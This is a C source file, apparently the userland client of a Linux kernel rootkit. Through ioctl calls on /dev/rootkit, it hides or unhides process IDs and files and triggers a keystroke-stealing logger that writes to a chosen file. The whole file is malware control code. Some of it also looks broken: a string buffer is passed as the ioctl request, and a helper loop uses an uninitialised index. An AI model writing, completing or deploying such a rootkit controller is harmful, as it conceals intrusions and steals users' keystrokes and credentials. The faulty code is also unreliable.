#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>
#include<string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#include "config.h"

void help();
void my_strcat(char* dest, char* src);

int main(int argc, char** argv){
    int fd = open("/dev/rootkit", 0);
    if(fd < 0){
        printf("Devce open Failed.\n");
        return -1;
    }
    char buf[4096] = MAGIC_HEAD;
    if(argc != 3){
        help();
        return -1;
    }
    if(!strcmp(argv[1], HIDE_PROC))
        printf("hide %d!\n", atoi(argv[2]));
    else if(!strcmp(argv[1], UNHIDE_PROC))
        printf("unhide %d!\n", atoi(argv[2]));
    else if(!strcmp(argv[1], HIDE_FILE))
        printf("hide %s!\n", argv[2]);
    else if(!strcmp(argv[1], UNHIDE_FILE))
        printf("unhide %s!\n", argv[2]);
    else if(!strcmp(argv[1], KEY))
        printf("Keysteal and save on %s!\n", argv[2]);
    else{
        help();
        return -1;
    }
    strcat(buf, argv[1]);
    strcat(buf, argv[2]);
    ioctl(fd, buf, strlen(buf));
    return 0;
}

void help(){
    printf("help...\n");
}

void my_strcat(char* dest, char* src){
    int index = strlen(dest);
    dest[index] = '\n';
    for(int i; ; i++){
        dest[index + i + 1] = src[i];
        if(src[i] == 0)
            break;
    }
}